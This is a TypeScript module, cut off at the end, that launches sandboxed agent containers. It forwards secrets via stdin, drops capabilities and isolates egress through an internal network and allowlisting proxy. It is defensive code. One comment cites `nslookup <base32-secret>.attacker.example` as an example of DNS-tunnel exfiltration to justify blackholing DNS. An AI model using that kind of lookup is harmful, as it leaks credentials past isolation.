/**
 * Container invocation building for the shared container runtime: the secrets
 * read from the host env/.env (passed via stdin), the Docker network
 * resolution/creation, and the `docker run` argument vector (env forwarding +
 * mount flags).
 */
import { spawnSync } from 'child_process';
import { createHash } from 'crypto';
import fs from 'fs';
import os from 'os';
import path from 'path';

import { CONTAINER_IMAGE, TIMEZONE } from './config.js';
import { readEnvFile } from './env.js';
import { logger } from './logger.js';
import {
  CONTAINER_RUNTIME_BIN,
  readonlyMountArgs,
} from './container_runtime.js';
import { VolumeMount } from './container_mounts.js';
import { deriveEgressAllowlist } from './egress_allowlist.js';

/**
 * Read allowed secrets from .env for passing to the container via stdin.
 * Secrets are never written to disk or mounted as files.
 */
export function readSecrets(): Record<string, string> {
  const secretKeys = [
    'OPENAI_API_KEY',
    'CLAUDE_CODE_OAUTH_TOKEN',
    'CLAUDE_CODE_OAUTH_REFRESH_TOKEN',
    'CLAUDE_CODE_OAUTH_SCOPES',
    'ANTHROPIC_API_KEY',
    'HF_TOKEN',
    'HUGGING_FACE_HUB_TOKEN',
  ];
  const out: Record<string, string> = {};
  for (const key of secretKeys) {
    if (process.env[key]) {
      out[key] = process.env[key]!;
    }
  }
  const fromFile = readEnvFile(secretKeys);
  for (const key of secretKeys) {
    if (!out[key] && fromFile[key]) {
      out[key] = fromFile[key];
    }
  }
  if (!out.HF_TOKEN && !out.HUGGING_FACE_HUB_TOKEN) {
    const tokenPath = path.join(
      process.env.HOME || '',
      '.cache',
      'huggingface',
      'token',
    );
    try {
      const token = fs.readFileSync(tokenPath, 'utf-8').trim();
      if (token) {
        out.HF_TOKEN = token;
      }
    } catch {
      // No huggingface-cli login token; leave HF auth unset.
    }
  }
  return out;
}

/** Resolve the Docker network mode from KSI_DOCKER_NETWORK env var.
 *  Defaults to "bridge" for network isolation. Set to "host" for legacy behavior. */
function resolveDockerNetwork(): string {
  return (process.env.KSI_DOCKER_NETWORK || 'bridge').trim();
}

/** Ensure a custom Docker network exists (no-op for built-in names like "bridge" and "host"). */
function ensureDockerNetwork(network: string): void {
  const builtinNetworks = new Set(['bridge', 'host', 'none']);
  if (builtinNetworks.has(network)) {
    return;
  }
  // Create the network if it doesn't already exist.
  // spawnSync is acceptable here since this runs once before first container launch.
  const result = spawnSync(CONTAINER_RUNTIME_BIN, ['network', 'create', network], {
    stdio: 'pipe',
    timeout: 10_000,
  });
  if (result.status === 0) {
    logger.info({ network }, 'Created Docker network');
  } else {
    // Network likely already exists — not an error.
    logger.debug(
      { network, stderr: result.stderr?.toString().trim() },
      'Docker network create returned non-zero (likely already exists)',
    );
  }
}

let _networkEnsured = false;

/** Read an int env var with a fallback, same pattern as `envInt` in
 *  native_memory.ts (not exported from there, so re-declared locally). */
function envInt(name: string, defaultValue: number): number {
  const raw = (process.env[name] || '').trim();
  if (!raw) return defaultValue;
  const parsed = Number.parseInt(raw, 10);
  if (Number.isNaN(parsed)) return defaultValue;
  return parsed;
}

/** Strict positive-integer env reader for the egress readiness/reap knobs
 *  (KSI_EGRESS_NET_READY_ATTEMPTS / _DELAY_MS / KSI_EGRESS_REAP_GRACE_MS).
 *  Accepted format: digits only (/^\d+$/) that parse to >= 1. Anything else —
 *  empty, "0", "-3", and crucially duration-style or scientific values like
 *  "600s", "1e3", "300.5", "5s" — falls back to `defaultValue`. Unlike
 *  `envInt`, this does NOT use bare `Number.parseInt`, which silently
 *  TRUNCATES those forms ("600s"→600, "1e3"→1, "300.5"→300): a truncated
 *  KSI_EGRESS_REAP_GRACE_MS="600s" would become a 600-MILLISECOND reap grace,
 *  silently re-opening the live-sibling-reaping race this guard closes, and a
 *  "0" attempts/grace would disable patience / reap mid-setup siblings. */
function envPositiveInt(name: string, defaultValue: number): number {
  const raw = (process.env[name] || '').trim();
  if (!/^\d+$/.test(raw)) return defaultValue;
  const parsed = Number.parseInt(raw, 10);
  if (!Number.isFinite(parsed) || parsed < 1) return defaultValue;
  return parsed;
}

/** Resource/capability hardening for untrusted agent-generated code (#1012).
 *  `--cap-drop=ALL` and `--security-opt=no-new-privileges` are unconditional —
 *  the Node/Python/git toolchain needs no elevated Linux capabilities and no
 *  setuid escalation path. `--pids-limit` defaults generous enough to cover
 *  legitimate build/test concurrency while still capping a fork bomb; override
 *  via KSI_CONTAINER_PIDS_LIMIT. `--memory`/`--cpus` are NOT set unless the
 *  operator opts in via KSI_CONTAINER_MEMORY_LIMIT/KSI_CONTAINER_CPU_LIMIT,
 *  since a wrong default could silently break larger embedding/build workloads. */
function resourceHardeningArgs(): string[] {
  const pidsLimit = envInt('KSI_CONTAINER_PIDS_LIMIT', 4096);
  const args = [
    '--cap-drop=ALL',
    '--security-opt=no-new-privileges',
    `--pids-limit=${pidsLimit}`,
  ];
  const memoryLimit = (process.env.KSI_CONTAINER_MEMORY_LIMIT || '').trim();
  if (memoryLimit) {
    args.push(`--memory=${memoryLimit}`);
  }
  const cpuLimit = (process.env.KSI_CONTAINER_CPU_LIMIT || '').trim();
  if (cpuLimit) {
    args.push(`--cpus=${cpuLimit}`);
  }
  return args;
}

/** Egress isolation is on by default. `KSI_EGRESS=open` restores the legacy
 *  direct-bridge behavior (no internal network, no proxy). */
function resolveEgressMode(): 'isolated' | 'open' {
  return String(process.env.KSI_EGRESS || '').trim().toLowerCase() === 'open'
    ? 'open'
    : 'isolated';
}

export function sanitizeEgressRunId(raw: unknown): string {
  const cleaned = String(raw ?? '')
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9_.-]+/g, '-')
    .replace(/^[^a-z0-9]+/, '')
    .replace(/[^a-z0-9]+$/, '')
    .slice(0, 64);
  return cleaned || String(process.pid);
}

const EGRESS_RUN_ID = sanitizeEgressRunId(process.env.KSI_RUN_ID || process.pid);
const EGRESS_PROXY_PORT = 8080;

export function egressResourceNames() {
  return {
    internalNet: `ksi-egress-int-${EGRESS_RUN_ID}`,
    externalNet: `ksi-egress-ext-${EGRESS_RUN_ID}`,
    proxyContainer: `ksi-egress-proxy-${EGRESS_RUN_ID}`,
    proxyPort: EGRESS_PROXY_PORT,
    // Agent reaches the proxy by container name via docker DNS on the internal net.
    proxyHostAlias: `ksi-egress-proxy-${EGRESS_RUN_ID}`,
  };
}

let _egressInfra: { internalNet: string; proxyAlias: string; proxyPort: number } | null = null;
let _egressTeardownRegistered = false;
let _egressLeasePath: string | null = null;

function dockerSync(args: string[], timeoutMs = 15_000) {
  return spawnSync(CONTAINER_RUNTIME_BIN, args, { stdio: 'pipe', timeout: timeoutMs });
}

function sleepSync(ms: number): void {
  spawnSync('sleep', [String(ms / 1000)]);
}

function egressLeaseRoot(): string {
  return path.join(process.env.KSI_EGRESS_LEASE_DIR || path.join(os.tmpdir(), 'ksi-egress-leases'), EGRESS_RUN_ID);
}

function isErrnoException(err: unknown): err is NodeJS.ErrnoException {
  return err instanceof Error && 'code' in err;
}

function rmRf(target: string): void {
  try {
    fs.rmSync(target, { recursive: true, force: true });
  } catch {
    // Best-effort cleanup only.
  }
}

const EGRESS_LOCK_STALE_MS = 120_000;
const EGRESS_LOCK_WAIT_MS = 30_000;

function processIdentity(pid: number): string | null {
  try {
    const stat = fs.readFileSync(`/proc/${pid}/stat`, 'utf-8');
    const closeParen = stat.lastIndexOf(')');
    if (closeParen < 0) return null;
    const fields = stat.slice(closeParen + 2).trim().split(/\s+/);
    const startTime = fields[19];
    if (!startTime) return null;
    let bootId = '';
    try {
      bootId = fs.readFileSync('/proc/sys/kernel/random/boot_id', 'utf-8').trim();
    } catch {
      bootId = '';
    }
    return `${bootId}:${pid}:${startTime}`;
  } catch {
    return null;
  }
}

function leaseOwnerPayload(): Record<string, unknown> {
  return {
    pid: process.pid,
    process_identity: processIdentity(process.pid),
    created_at: new Date().toISOString(),
  };
}

function processAliveForOwner(owner: { pid?: unknown; process_identity?: unknown }): boolean {
  const pid = typeof owner.pid === 'number' ? owner.pid : null;
  if (pid === null || !processAlive(pid)) return false;
  const expectedIdentity = typeof owner.process_identity === 'string' ? owner.process_identity : '';
  if (!expectedIdentity) return true;
  const actualIdentity = processIdentity(pid);
  return actualIdentity === null || actualIdentity === expectedIdentity;
}

function readOwnerJson(pathName: string): { pid?: unknown; process_identity?: unknown } | null {
  try {
    const raw = JSON.parse(fs.readFileSync(pathName, 'utf-8')) as unknown;
    return raw && typeof raw === 'object' && !Array.isArray(raw)
      ? raw as { pid?: unknown; process_identity?: unknown }
      : null;
  } catch {
    return null;
  }
}

export function shouldBreakEgressLeaseLock(lockDir: string, nowMs: number = Date.now()): boolean {
  let stat: fs.Stats;
  try {
    stat = fs.statSync(lockDir);
  } catch {
    return false;
  }
  if (nowMs - stat.mtimeMs <= EGRESS_LOCK_STALE_MS) return false;
  const owner = readOwnerJson(path.join(lockDir, 'owner.json'));
  return owner === null || !processAliveForOwner(owner);
}

function withEgressLeaseLock<T>(fn: () => T): T {
  const root = egressLeaseRoot();
  fs.mkdirSync(root, { recursive: true });
  const lockDir = path.join(root, '.lock');
  const deadline = Date.now() + EGRESS_LOCK_WAIT_MS;

  for (;;) {
    try {
      fs.mkdirSync(lockDir);
      fs.writeFileSync(
        path.join(lockDir, 'owner.json'),
        JSON.stringify(leaseOwnerPayload()),
        'utf-8',
      );
      break;
    } catch (err) {
      if (!isErrnoException(err) || err.code !== 'EEXIST') {
        throw err;
      }
      if (shouldBreakEgressLeaseLock(lockDir)) {
        rmRf(lockDir);
        continue;
      }
      if (Date.now() >= deadline) {
        throw new Error(`Timed out waiting for egress lease lock ${lockDir}`);
      }
      sleepSync(100);
    }
  }

  try {
    return fn();
  } finally {
    rmRf(lockDir);
  }
}

function processAlive(pid: number): boolean {
  if (!Number.isInteger(pid) || pid <= 0) return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch (err) {
    return isErrnoException(err) && err.code === 'EPERM';
  }
}

function leaseFiles(): string[] {
  try {
    return fs.readdirSync(egressLeaseRoot())
      .filter((name) => name.endsWith('.lease'))
      .map((name) => path.join(egressLeaseRoot(), name));
  } catch {
    return [];
  }
}

export function acquireEgressLease(): string {
  if (_egressLeasePath) return _egressLeasePath;
  fs.mkdirSync(egressLeaseRoot(), { recursive: true });
  const token = `${process.pid}-${Date.now()}-${Math.random().toString(36).slice(2)}`;
  const leasePath = path.join(egressLeaseRoot(), `${token}.lease`);
  fs.writeFileSync(
    leasePath,
    JSON.stringify(leaseOwnerPayload()),
    'utf-8',
  );
  _egressLeasePath = leasePath;
  return leasePath;
}

export function releaseEgressLease(): void {
  if (!_egressLeasePath) return;
  try {
    fs.unlinkSync(_egressLeasePath);
  } catch {
    // Lease cleanup is best-effort; stale leases are pruned by live siblings.
  }
  _egressLeasePath = null;
}

function pruneStaleEgressLeases(): void {
  for (const leasePath of leaseFiles()) {
    const owner = readOwnerJson(leasePath);
    if (owner === null || !processAliveForOwner(owner)) {
      try {
        fs.unlinkSync(leasePath);
      } catch {
        // Ignore races with other cleanup.
      }
    }
  }
}

export function activeEgressLeaseCount(): number {
  pruneStaleEgressLeases();
  return leaseFiles().length;
}

export function egressAllowlistSignature(allowlist: string[]): string {
  const normalized = [...allowlist].map((item) => String(item).trim()).filter(Boolean).sort();
  return createHash('sha256').update(normalized.join('\n')).digest('hex');
}

/** `docker run` args for the egress-proxy sidecar, hardened with the same
 *  resource/capability limits as agent containers (#1025 follow-up to #1019)
 *  — the proxy is fixed code with no need for elevated capabilities, setuid
 *  escalation, or unbounded process spawning. Exported as a pure function
 *  (mirrors buildContainerArgs) so tests can assert on the constructed argv
 *  without actually starting a container. */
export function proxyContainerRunArgs(
  names: ReturnType<typeof egressResourceNames>,
  allowlist: string[],
): string[] {
  const allowlistSignature = egressAllowlistSignature(allowlist);
  return [
    'run', '-d', '--rm',
    '--name', names.proxyContainer,
    '--network', names.externalNet,
    '--label', `ksi.egress.allowlist-sha256=${allowlistSignature}`,
    ...resourceHardeningArgs(),
    '-e', `KSI_EGRESS_PROXY_PORT=${names.proxyPort}`,
    '-e', `KSI_EGRESS_ALLOWLIST=${allowlist.join(',')}`,
    '--entrypoint', 'node',
    CONTAINER_IMAGE,
    '/tmp/dist/egress_proxy_main.js',
  ];
}

type DockerRunResult = { status: number | null; stdout?: Buffer | string | null; stderr?: Buffer | string | null };
type DockerRunner = (args: string[], timeoutMs?: number) => DockerRunResult;

// Readiness-poll budget for network creation under docker-daemon contention.
// Exponential backoff from DELAY_MS doubling up to MAX_DELAY_MS: with the
// defaults that is 300+600+1200+2400+4800+5000×4 ≈ 29s of total patience
// (vs the pre-incident 5 × 300ms ≈ 1.5s, which mass-failed 76-88% of
// attempts when 3 concurrent campaigns created 18 network pairs at once,
// 2026-07-03). Env-overridable via KSI_EGRESS_NET_READY_ATTEMPTS /
// KSI_EGRESS_NET_READY_DELAY_MS (base delay). Both are read with the strict
// `envPositiveInt` reader: only digits-only values >= 1 are accepted; anything
// else (empty, "0", "-3", "600s", "1e3", "300.5") falls back to the default.
const DEFAULT_NET_READY_ATTEMPTS = 10;
const DEFAULT_NET_READY_DELAY_MS = 300;
const NET_READY_MAX_DELAY_MS = 5_000;

/** Create (and verify) a custom Docker network, retrying under docker-daemon
 *  contention. Shared campaign leases now collapse normal task fanout to one
 *  network pair per Python campaign process, but concurrent campaigns and
 *  legacy/manual per-process run ids can still ask the daemon to create many
 *  bridges at once. `docker network create` is not perfectly parallel-safe at
 *  that concurrency (kernel-level bridge/iptables setup can transiently fail).
 *  Observed in the wild as the external network's create silently failing with
 *  no verification, then the proxy container's `docker run --network <ext>`
 *  dying with "network ... not found" (#see ensureEgressInfra). Verifies
 *  existence (and --internal-ness when
 *  `requireInternal`) via inspect between attempts rather than trusting
 *  create's exit code, since "already exists" is itself non-zero and legitimate.
 *  Sleeps with exponential backoff between attempts (see
 *  DEFAULT_NET_READY_ATTEMPTS above for the budget rationale): daemon
 *  contention during a launch storm clears in seconds-to-tens-of-seconds, so
 *  patience is the correct response; exhausting the budget still fails closed
 *  (refusing to launch unisolated). Exported (with injectable `runDocker` and
 *  `sleeper`) so the retry/backoff behavior is unit-testable without a real
 *  docker daemon. */
export function ensureEgressDockerNetwork(
  name: string,
  opts: {
    requireInternal?: boolean;
    attempts?: number;
    delayMs?: number;
    runDocker?: DockerRunner;
    sleeper?: (ms: number) => void;
  } = {},
): void {
  const requireInternal = opts.requireInternal ?? false;
  const attempts = Math.max(
    1,
    opts.attempts ?? envPositiveInt('KSI_EGRESS_NET_READY_ATTEMPTS', DEFAULT_NET_READY_ATTEMPTS),
  );
  const delayMs = Math.max(
    0,
    opts.delayMs ?? envPositiveInt('KSI_EGRESS_NET_READY_DELAY_MS', DEFAULT_NET_READY_DELAY_MS),
  );
  const runDocker = opts.runDocker ?? dockerSync;
  const sleeper = opts.sleeper ?? sleepSync;

  for (let attempt = 1; attempt <= attempts; attempt++) {
    runDocker(requireInternal ? ['network', 'create', '--internal', name] : ['network', 'create', name]);
    const inspect = runDocker(['network', 'inspect', '-f', '{{.Internal}}', name]);
    const exists = inspect.status === 0;
    const internalOk = !requireInternal || String(inspect.stdout ?? '').trim() === 'true';
    if (exists && internalOk) {
      return;
    }
    if (attempt < attempts) {
      runDocker(['network', 'rm', name]);
      sleeper(Math.min(delayMs * 2 ** (attempt - 1), NET_READY_MAX_DELAY_MS));
    }
  }
  throw new Error(
    `Docker network ${name} did not become ready after ${attempts} attempt(s)` +
    (requireInternal ? ' (must be --internal); refusing to launch unisolated' : ''),
  );
}

const EGRESS_NETWORK_NAME_PATTERN = /^ksi-egress-(?:int|ext)-([a-z0-9][a-z0-9_.-]*)$/;

// Env-overridable via KSI_EGRESS_REAP_GRACE_MS. Raised 120s → 600s after
// the 2026-07-03 launch-storm incident: under docker contention (3 concurrent
// campaigns × 6 containers) proxies took minutes to attach, and ~38 tasks
// died at one instant ~240s after launch — consistent with siblings' networks
// crossing the old 120s grace mid-setup and being reaped out from under them.
// The only cost of a longer grace is slower cleanup of truly-orphaned
// networks: a network leaked by a hard-killed process (whose exit handlers
// never ran) now lingers up to 10 minutes, so recovery from a kill-storm that
// exhausted docker's address pool can take up to that long unless networks are
// pruned manually. (Clean/thrown launch failures self-clean via
// teardownEgressInfra and are unaffected.) Env-overridable via
// KSI_EGRESS_REAP_GRACE_MS, read with the strict `envPositiveInt` reader:
// only digits-only values >= 1 are accepted; anything else (empty, "0", "-3",
// "600s", "1e3", "300.5") falls back to this default.
const DEFAULT_REAP_GRACE_MS = 600_000;

/** Garbage-collect orphaned egress network pairs left behind by processes
 *  killed before their `process.once('exit'/'SIGINT'/'SIGTERM',
 *  teardownEgressInfra)` handler could run (e.g. a background campaign
 *  stopped via a hard process-group kill). Shared leases clean up normal
 *  task-process exits, but hard-killed campaigns and older per-process run-id
 *  launches can still leave Docker networks behind. Docker's network
 *  address-pool is finite; left unreaped these accumulate across a session until
 *  `docker network create` fails outright with "all predefined address pools
 *  have been fully subnetted" — a hard resource-exhaustion failure retries
 *  alone cannot fix (observed in production: 30 leaked ksi-egress-* networks
 *  from earlier killed campaigns in one session).
 *
 *  Only removes a network when its corresponding proxy container for the
 *  same run id no longer exists, it has zero attached containers, AND it is
 *  older than `graceMs` (default 600s, env-overridable via
 *  KSI_EGRESS_REAP_GRACE_MS). The first two conditions alone do
 *  NOT prove the trio is dead — they do not close the gap for a network
 *  that's mid-setup by a concurrently STARTING sibling process: that
 *  sibling's own `ensureEgressInfra()` creates its networks first and only
 *  afterward starts and attaches its proxy container, so for a brief window
 *  its brand-new networks have no proxy yet and zero containers, exactly
 *  matching both conditions. A different process's `reapStaleEgressNetworks`
 *  call can observe that window and delete the sibling's networks out from
 *  under it (confirmed in production: 113+ "network ... not found" / "did
 *  not become ready" failures during a 44-agent, 30-way-concurrent
 *  campaign). The age guard requires a network to be older than `graceMs`
 *  — long enough that a legitimately-starting sibling's proxy should have
 *  attached by then — before either of the other two conditions is trusted.
 *  If the age can't be determined (inspect fails or returns an unparsable
 *  timestamp), the network is treated as too young to reap (fail-safe). */
export function reapStaleEgressNetworks(
  runDocker: DockerRunner = dockerSync,
  graceMs: number = Math.max(0, envPositiveInt('KSI_EGRESS_REAP_GRACE_MS', DEFAULT_REAP_GRACE_MS)),
): void {
  const listed = runDocker(['network', 'ls', '--format', '{{.Name}}']);
  const names = String(listed.stdout ?? '')
    .split('\n')
    .map((s) => s.trim())
    .filter(Boolean);

  const seenRunIds = new Set<string>();
  for (const name of names) {
    const match = name.match(EGRESS_NETWORK_NAME_PATTERN);
    if (match) seenRunIds.add(match[1]);
  }

  for (const runId of seenRunIds) {
    const proxyAlive = runDocker(['inspect', `ksi-egress-proxy-${runId}`]).status === 0;
    if (proxyAlive) continue;

    for (const netName of [`ksi-egress-int-${runId}`, `ksi-egress-ext-${runId}`]) {
      if (!names.includes(netName)) continue;
      const inspect = runDocker(['network', 'inspect', '-f', '{{len .Containers}}', netName]);
      const containerCount = Number.parseInt(String(inspect.stdout ?? '').trim(), 10);
      if (inspect.status !== 0 || containerCount !== 0) continue;

      // `{{json .Created}}` emits a QUOTED RFC3339Nano string (e.g.
      // "2026-07-03T14:21:57.033059102-07:00"), which V8's Date parser
      // handles regardless of host timezone. The bare `{{.Created}}` form
      // emits Go's time.Time.String() ("2026-07-03 14:22:13.778 -0700 PDT"),
      // whose trailing zone ABBREVIATION V8 only parses for US/GMT zones —
      // on CET/JST/IST/... hosts every timestamp read as NaN and the
      // fail-safe skip silently disabled the reaper entirely.
      const createdInspect = runDocker(['network', 'inspect', '-f', '{{json .Created}}', netName]);
      if (createdInspect.status !== 0) continue;
      let createdRaw: unknown;
      try {
        createdRaw = JSON.parse(String(createdInspect.stdout ?? '').trim());
      } catch {
        continue; // not valid JSON → unparseable timestamp → fail-safe skip
      }
      const createdAt = new Date(String(createdRaw));
      if (Number.isNaN(createdAt.getTime())) continue;
      if (Date.now() - createdAt.getTime() <= graceMs) continue;

      runDocker(['network', 'rm', netName]);
    }
  }
}

function egressNetworkReady(name: string, requireInternal: boolean): boolean {
  const inspect = dockerSync(['network', 'inspect', '-f', '{{.Internal}}', name]);
  if (inspect.status !== 0) return false;
  return !requireInternal || String(inspect.stdout ?? '').trim() === 'true';
}

function egressProxyReady(names: ReturnType<typeof egressResourceNames>, allowlist: string[]): boolean {
  if (!egressNetworkReady(names.internalNet, true)) return false;
  if (!egressNetworkReady(names.externalNet, false)) return false;
  if (dockerSync(['inspect', names.proxyContainer]).status !== 0) return false;
  const allowlistLabel = dockerSync([
    'inspect',
    '-f',
    '{{ index .Config.Labels "ksi.egress.allowlist-sha256" }}',
    names.proxyContainer,
  ]);
  if (
    allowlistLabel.status !== 0
    || String(allowlistLabel.stdout ?? '').trim() !== egressAllowlistSignature(allowlist)
  ) {
    return false;
  }
  const logs = dockerSync(['logs', names.proxyContainer]);
  return logs.status === 0 && (logs.stdout?.toString() || '').includes('[egress-proxy] READY');
}

function waitForEgressProxyReady(
  names: ReturnType<typeof egressResourceNames>,
  allowlist: string[],
  timeoutMs: number,
): boolean {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (egressProxyReady(names, allowlist)) return true;
    sleepSync(300);
  }
  return false;
}

function removeEgressResources(names: ReturnType<typeof egressResourceNames>): void {
  for (const cmd of [
    ['rm', '-f', names.proxyContainer],
    ['network', 'rm', names.internalNet],
    ['network', 'rm', names.externalNet],
  ]) {
    const result = dockerSync(cmd);
    if (result.status !== 0) {
      logger.warn(
        { cmd: [CONTAINER_RUNTIME_BIN, ...cmd].join(' '), status: result.status, stderr: result.stderr?.toString().trim() },
        'Failed to remove egress resource',
      );
    }
  }
  _egressInfra = null;
}

function registerEgressTeardown(): void {
  if (_egressTeardownRegistered) return;
  _egressTeardownRegistered = true;
  process.once('exit', teardownEgressInfra);
  process.once('SIGINT', () => { teardownEgressInfra(); process.exit(130); });
  process.once('SIGTERM', () => { teardownEgressInfra(); process.exit(143); });
}

function egressInfraDescriptor(names: ReturnType<typeof egressResourceNames>) {
  return {
    internalNet: names.internalNet,
    proxyAlias: names.proxyHostAlias,
    proxyPort: names.proxyPort,
  };
}

/** Create or join the internal+external networks and allowlisting proxy
 *  sidecar. Idempotent per process; returns null in open mode. A Python
 *  campaign now stamps one KSI_RUN_ID for all runner subprocesses, so this
 *  function uses a filesystem lease to share the Docker resources safely across
 *  those sibling processes and tears them down only after the last lease exits. */
export function ensureEgressInfra():
  | { internalNet: string; proxyAlias: string; proxyPort: number }
  | null {
  if (resolveEgressMode() === 'open') {
    logger.warn(
      { ksiEgress: 'open' },
      'KSI_EGRESS=open: egress isolation DISABLED — agent containers have unrestricted network access (debugging only, never production)',
    );
    return null;
  }
  if (_egressInfra) return _egressInfra;

  const names = egressResourceNames();
  const allowlist = deriveEgressAllowlist();
  try {
    acquireEgressLease();
    _egressInfra = withEgressLeaseLock(() => {
      // Reap orphaned networks left by killed runs before creating or joining
      // the shared campaign infra. Then, under the lock, either reuse an
      // already-ready proxy or replace a broken partial setup for this run id.
      reapStaleEgressNetworks();
      if (egressProxyReady(names, allowlist)) {
        return egressInfraDescriptor(names);
      }
      removeEgressResources(names);

      // Internal network: no route to the internet (kernel-enforced boundary).
      // External network: normal bridge so the dual-homed proxy can egress.
      ensureEgressDockerNetwork(names.internalNet, { requireInternal: true });
      ensureEgressDockerNetwork(names.externalNet, { requireInternal: false });

      // Start the proxy on the external network first, then attach the internal.
      // Retry a couple of times: same docker-daemon contention as the networks
      // above can transiently fail `docker run` too.
      let start = dockerSync(proxyContainerRunArgs(names, allowlist), 30_000);
      for (let attempt = 1; attempt < 3 && start.status !== 0; attempt++) {
        dockerSync(['rm', '-f', names.proxyContainer]);
        sleepSync(500);
        start = dockerSync(proxyContainerRunArgs(names, allowlist), 30_000);
      }
      if (start.status !== 0) {
        removeEgressResources(names);
        throw new Error(
          `Failed to start egress proxy: ${start.stderr?.toString().trim()}`,
        );
      }
      dockerSync(['network', 'connect', names.internalNet, names.proxyContainer]);

      if (!waitForEgressProxyReady(names, allowlist, 15_000)) {
        removeEgressResources(names);
        throw new Error('Egress proxy did not become ready within 15s');
      }

      return egressInfraDescriptor(names);
    });
  } catch (err) {
    try {
      withEgressLeaseLock(() => {
        releaseEgressLease();
        if (activeEgressLeaseCount() === 0) {
          removeEgressResources(names);
          rmRf(egressLeaseRoot());
        }
      });
    } catch (cleanupErr) {
      logger.warn({ err: String(cleanupErr) }, 'Failed to clean up egress lease after setup failure');
    }
    throw err;
  }

  logger.info(
    { internalNet: names.internalNet, allow: allowlist },
    'Egress isolation active (internal network + allowlisting proxy)',
  );

  registerEgressTeardown();
  return _egressInfra;
}

/** Idempotent teardown. Safe to call multiple times and from signal handlers. */
function teardownEgressInfra(): void {
  const names = egressResourceNames();
  try {
    withEgressLeaseLock(() => {
      releaseEgressLease();
      if (activeEgressLeaseCount() > 0) {
        _egressInfra = null;
        return;
      }
      removeEgressResources(names);
      rmRf(egressLeaseRoot());
    });
  } catch (err) {
    logger.warn({ err: String(err) }, 'Failed to tear down egress infra lease cleanly');
  }
}

export function buildContainerArgs(
  mounts: VolumeMount[],
  containerName: string,
  egress: { internalNet: string; proxyAlias: string; proxyPort: number } | null,
): string[] {
  let network: string;
  const proxyEnv: string[] = [];
  // Extra `docker run` flags collected only in isolated mode (DNS hardening).
  const isolationArgs: string[] = [];

  if (egress) {
    // Isolated: attach ONLY to the internal (no-route) network; legit traffic
    // exits via the allowlisting proxy reachable by docker DNS name.
    network = egress.internalNet;
    const proxyUrl = `http://${egress.proxyAlias}:${egress.proxyPort}`;
    proxyEnv.push(
      '-e', `HTTPS_PROXY=${proxyUrl}`,
      '-e', `HTTP_PROXY=${proxyUrl}`,
      '-e', `NO_PROXY=localhost,127.0.0.1`,
      // Lowercase variants for tools that only read those.
      '-e', `https_proxy=${proxyUrl}`,
      '-e', `http_proxy=${proxyUrl}`,
      '-e', `no_proxy=localhost,127.0.0.1`,
    );
    // Close the DNS-tunnel exfil residual (issue #934). `--internal` removes the
    // IP route out but Docker's embedded resolver (127.0.0.11) can still forward
    // *external* name lookups to the daemon's upstream resolvers — a low-bandwidth
    // exfil channel (`nslookup <base32-secret>.attacker.example`). Point the
    // agent's only upstream at a non-routable blackhole: the embedded resolver
    // still answers Docker service discovery (the proxy container name) locally,
    // but every external lookup SERVFAILs. The agent never needs external DNS —
    // the proxy resolves provider hostnames upstream on its behalf. This holds
    // regardless of whether the Docker build runs its DNS forwarder host- or
    // container-side, so it does not rely on `--internal` happening to block it.
    isolationArgs.push('--dns', '0.0.0.0');
  } else {
    // Open mode (escape hatch): legacy direct bridge behavior.
    network = resolveDockerNetwork();
    if (!_networkEnsured) {
      ensureDockerNetwork(network);
      _networkEnsured = true;
    }
  }

  const args: string[] = ['run', '-i', '--rm', '--network', network, '--name', containerName, ...resourceHardeningArgs(), ...isolationArgs, ...proxyEnv];

  // Pass host timezone so container's local time matches the user's
  args.push('-e', `TZ=${TIMEZONE}`);
  // Forward explicit provider/model/auth selection plus knowledge/runtime DB
  // paths into the container so the SDK and MCP server resolve correctly.
  //
  // LOG_LEVEL / ANTHROPIC_LOG are forwarded so operators can set
  // `LOG_LEVEL=debug` on the host and observe SDK subprocess stderr
  // inside the container. Without this forward, the host's LOG_LEVEL
  // never reaches the child process, leaving silent-fail repros blind.
  for (const key of [
    'MODEL_PROVIDER',
    'MODEL',
    'MODEL_AUTH_MODE',
    'REASONING_EFFORT',
    'RUNTIME_DB_PATH',
    'KNOWLEDGE_DB_PATH',
    'FORUM_GENERATION',
    'EXPERIMENT_NAME',
    'LOG_LEVEL',
    'ANTHROPIC_LOG',
    'KSI_OPENAI_MAX_TURNS',
    'KSI_CLAUDE_MAX_TURNS',
    'OPENAI_AGENTS_DISABLE_TRACING',
    'KSI_RUNNER_ROOT',
    // Forwarded but no longer consumed by the agent-runner (the direct-ARC
    // adapter that read it was removed); kept to avoid coupling with the
    // later Python phase that still sets it. Harmless when unused.
    'KSI_ANTHROPIC_ARC_ADAPTER',
    // Web-tool opt-in (issue #666). Default OFF. When set truthy, the Claude
    // agent-runner offers WebSearch/WebFetch on non-ARC benchmark tasks; ARC
    // stays strictly offline regardless. Forwarded into the container env so
    // index.ts can read it from sdkEnv.
    'KSI_ALLOW_WEB_TOOLS',
    // Egress-isolation mode. Only ever set to the string 'open' (isolation
    // disabled, debugging only). Forwarded so the agent-runner can scope the
    // native-tool-secret denial below to the open-egress mode — the only mode
    // where a tool that reads a secret could exfiltrate it. Unset in production
    // (isolation on), so it is never pushed into the container env there.
    'KSI_EGRESS',
    // Safety override for the Claude Code SDK path. Native file/shell tools are
    // denied only when egress isolation is disabled (KSI_EGRESS=open) AND
    // credentials are present in sdkEnv, because a same-UID tool can read the
    // parent SDK process environment and, with egress open, exfiltrate it. Set
    // truthy to restore native tools even in that debug mode.
    'KSI_ALLOW_UNSAFE_CLAUDE_NATIVE_TOOLS_WITH_SECRETS',
    // Flag-gated OpenAI scaffold parity (issue #634). Default OFF. When set
    // truthy, the OpenAI agent-runner adds native read/write/edit/glob/grep
    // function tools and prepends a richer agentic-coding system prompt on
    // non-ARC tasks.
    'OPENAI_PARITY_TOOLS',
  ]) {
    const value = process.env[key];
    if (value && value.trim()) {
      args.push('-e', `${key}=${value}`);
    }
  }
  const embeddingModel = process.env.KSI_EMBEDDING_MODEL || 'google/embeddinggemma-300m';
  args.push(
    '-e',
    `MEMORY_ENABLE_SEMANTIC_SEARCH=${process.env.MEMORY_ENABLE_SEMANTIC_SEARCH || '1'}`,
    '-e',
    `KSI_EMBEDDING_MODEL=${embeddingModel}`,
    '-e',
    `USE_TF=${process.env.USE_TF || '0'}`,
    '-e',
    `TOKENIZERS_PARALLELISM=${process.env.TOKENIZERS_PARALLELISM || 'false'}`,
    '-e',
